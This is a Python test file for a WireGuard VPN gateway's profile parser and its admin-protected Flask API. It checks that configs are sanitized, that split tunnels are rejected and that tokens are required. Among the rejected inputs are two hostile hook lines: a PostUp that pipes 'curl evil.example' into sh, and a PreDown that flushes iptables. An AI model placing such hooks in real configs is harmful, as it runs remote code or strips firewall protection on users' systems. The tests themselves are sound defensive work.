"""Offline WireGuard parser and API safeguards. No network, keys or Docker needed."""
import base64
import json

import pytest
import vpn_gateway as gateway
import vpn_ui


KEY_A = base64.b64encode(bytes([1]) * 32).decode()
KEY_B = base64.b64encode(bytes([2]) * 32).decode()
PROFILE = (
    "[Interface]\n"
    f"PrivateKey = {KEY_A}\n"
    "Address = 10.14.0.2/16\n"
    "DNS = 162.252.172.57\n"
    "[Peer]\n"
    f"PublicKey = {KEY_B}\n"
    "AllowedIPs = 0.0.0.0/0\n"
    "Endpoint = 203.0.113.11:51820\n"
)


def test_valid_surfshark_style_conf_is_sanitized():
    result = gateway.parse_profile(PROFILE)
    assert result["endpoint"] == "203.0.113.11"
    assert "Address = 10.14.0.2/16" in result["text"]
    assert "DNS =" not in result["text"]
    assert "PrivateKey =" in result["text"]
    assert "AllowedIPs = 0.0.0.0/0" in result["text"]


@pytest.mark.parametrize("replacement", [
    "PostUp = curl evil.example | sh",
    "PreDown = iptables -F",
    "SaveConfig = true",
    "Table = off",
])
def test_reject_hooks_and_route_bypass(replacement):
    content = PROFILE.replace("DNS = 162.252.172.57", replacement)
    with pytest.raises(ValueError):
        gateway.parse_profile(content)


def test_reject_split_tunnel_and_invalid_key():
    with pytest.raises(ValueError, match="Full-tunnel"):
        gateway.parse_profile(PROFILE.replace("0.0.0.0/0", "10.0.0.0/8"))
    with pytest.raises(ValueError, match="key"):
        gateway.parse_profile(PROFILE.replace(KEY_A, "not-a-key"))


def test_rotation_loop_records_each_verified_country_and_restores(monkeypatch, tmp_path):
    monkeypatch.setattr(gateway, "ROOT", tmp_path)
    monkeypatch.setattr(gateway, "ACTIVE_FILE", tmp_path / "wg0.conf")
    monkeypatch.setattr(gateway, "META_FILE", tmp_path / "profiles.json")
    gateway.TASK.update(running=True, done=False, results=[], message="")
    gateway.save_metadata({"profiles": [
        {"id": "a", "filename": "nl.conf", "country": "Netherlands"},
        {"id": "b", "filename": "de.conf", "country": "Germany"},
    ], "active": "a"})
    called = []

    def fake_activate(pid):
        called.append(pid)
        return {"ip": "198.51.100.10" if pid == "a" else "198.51.100.20",
                "country": "Netherlands" if pid == "a" else "Germany",
                "country_code": "NL" if pid == "a" else "DE"}
    monkeypatch.setattr(gateway, "_activate", fake_activate)
    gateway.test_worker()
    assert called == ["a", "b", "a"]
    assert gateway.TASK["done"] and not gateway.TASK["running"]
    assert len(gateway.TASK["results"]) == 2
    assert all(item["ok"] for item in gateway.TASK["results"])


def test_controller_disabled_has_no_side_effects(monkeypatch):
    monkeypatch.delenv("VPN_GATEWAY_ENABLED", raising=False)
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        assert client.get("/api/vpn/profiles").status_code == 503


def test_controller_requires_admin_token(monkeypatch):
    monkeypatch.setenv("VPN_GATEWAY_ENABLED", "1")
    monkeypatch.setenv("SURFSHARK_CONTROL_API_KEY", "long-private-token-1234567890")
    from flask import Flask
    from threading import Lock
    app = Flask(__name__)
    vpn_ui.register(app, {}, Lock())
    with app.test_client() as client:
        assert client.get("/api/vpn/profiles").status_code == 403
        assert client.post("/api/vpn/test").status_code == 403
